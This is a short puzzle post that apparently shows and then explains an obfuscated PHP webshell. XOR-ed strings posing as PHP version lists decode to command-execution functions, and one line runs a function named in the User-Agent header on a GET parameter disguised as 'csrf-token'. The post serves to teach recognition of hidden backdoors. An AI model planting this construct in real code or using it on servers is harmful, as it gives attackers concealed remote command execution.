# What does this code do?
seriously.

<details>
<summary>Spoiler warning</summary>
It's a webshell :) 
<code>
  public const VERSIONS = array(
        "KWBZUA" ^ "8.1.0, 8.1.1, 8.1.2",
        "GADK_" ^ "7.4.14, 7.4.13, 7.4.12",
        "RVQM" ^ "7.4.24, 7.4.23, 7.4.22",
        "GOG]FY^U" ^ "7.4.21, 7.4.20, 7.4.19",
        "G\[MnW\EY" ^ "7.4.18, 7.4.16, 7.4.15",
  );
</code>
  is identical to
<code>
  public const VERSIONS = array(
        "system",
        "popen",
        "exec",
        "passthru",
        "proc_open",
    );
</code>
and
<code>
${"_SERVER"}["HTTP_USER_AGENT"]($_GET["csrf-token"]);
</code>
is identical to 
<code>
$_SERVER["HTTP_USER_AGENT"]($_GET["csrf-token"]);
</code>

</details>
